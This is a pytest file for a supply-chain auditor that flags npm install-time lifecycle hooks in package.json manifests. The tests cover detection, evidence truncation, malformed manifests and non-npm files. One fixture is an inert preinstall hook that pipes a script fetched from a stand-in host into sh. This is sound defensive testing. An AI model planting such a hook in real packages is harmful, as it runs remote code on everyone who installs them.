"""Supply-chain manifest detectors: npm install-time lifecycle hooks in package.json.

The malicious sample is inert — the network target is an RFC-reserved non-resolving host
(`example.invalid`) and the manifest is never installed; it exists only to exercise the detector."""

import pytest
from _support import rule_ids, run_manifest_audit

_POSTINSTALL = (
    '{\n  "name": "x",\n  "version": "1.0.0",\n'
    '  "scripts": {\n    "postinstall": "node ./scripts/build.js"\n  }\n}\n'
)
_PREINSTALL_CURL = (
    '{\n  "name": "x",\n'
    '  "scripts": {\n    "preinstall": "curl http://example.invalid/x.sh | sh"\n  }\n}\n'
)
_CLEAN = (
    '{\n  "name": "x",\n'
    '  "scripts": {\n    "build": "tsc",\n    "test": "jest"\n  }\n}\n'
)


@pytest.mark.parametrize(
    "src", [_POSTINSTALL, _PREINSTALL_CURL], ids=["postinstall", "preinstall"]
)
def test_flags_install_hooks(src):
    assert "MF-SUPPLY-INSTALL-HOOK" in rule_ids(run_manifest_audit(src))


def test_ignores_non_lifecycle_scripts():
    # build/test scripts run on demand, not on `npm install` — not an install-time hook
    assert "MF-SUPPLY-INSTALL-HOOK" not in rule_ids(run_manifest_audit(_CLEAN))


def test_evidence_is_the_script_body():
    finding = next(
        f
        for f in run_manifest_audit(_POSTINSTALL).findings
        if f.rule_id == "MF-SUPPLY-INSTALL-HOOK"
    )
    assert finding.evidence == "node ./scripts/build.js"


def test_malformed_manifest_is_quiet():
    # a manifest that doesn't parse yields nothing, never an exception
    assert run_manifest_audit("{ not valid json ").findings == []


def test_all_three_lifecycle_hooks_each_flag():
    src = (
        '{\n  "scripts": {\n'
        '    "preinstall": "a",\n    "install": "b",\n    "postinstall": "c"\n'
        "  }\n}\n"
    )
    hooks = [
        f
        for f in run_manifest_audit(src).findings
        if f.rule_id == "MF-SUPPLY-INSTALL-HOOK"
    ]
    assert len(hooks) == 3


# manifests that must produce NO install-hook finding — malformed/empty shapes, not crashes
_QUIET = {
    "no-scripts": '{"name": "x", "version": "1.0.0"}\n',
    "empty-object": "{}\n",
    "scripts-not-a-dict": '{"scripts": "build"}\n',
    "hook-not-a-string": '{"scripts": {"postinstall": ["a", "b"]}}\n',
    "hook-is-null": '{"scripts": {"postinstall": null}}\n',
    "hook-is-empty": '{"scripts": {"postinstall": "   "}}\n',  # whitespace-only — nothing runs
}


@pytest.mark.parametrize("src", list(_QUIET.values()), ids=list(_QUIET))
def test_malformed_or_empty_hook_shapes_do_not_flag(src):
    assert "MF-SUPPLY-INSTALL-HOOK" not in rule_ids(run_manifest_audit(src))


def test_long_hook_body_evidence_is_truncated():
    body = "node " + "x" * 500
    src = '{"scripts": {"postinstall": "' + body + '"}}\n'
    finding = next(
        f
        for f in run_manifest_audit(src).findings
        if f.rule_id == "MF-SUPPLY-INSTALL-HOOK"
    )
    assert len(finding.evidence) == 200  # capped, never the whole blob


def test_install_hook_is_npm_only():
    # the npm lifecycle-hook check must no-op on a non-npm manifest (here, a pyproject.toml)
    src = '[project]\nname = "x"\n[tool.poetry.scripts]\npostinstall = "x:main"\n'
    res = run_manifest_audit(src, rel_path="pyproject.toml")
    assert "MF-SUPPLY-INSTALL-HOOK" not in rule_ids(res)
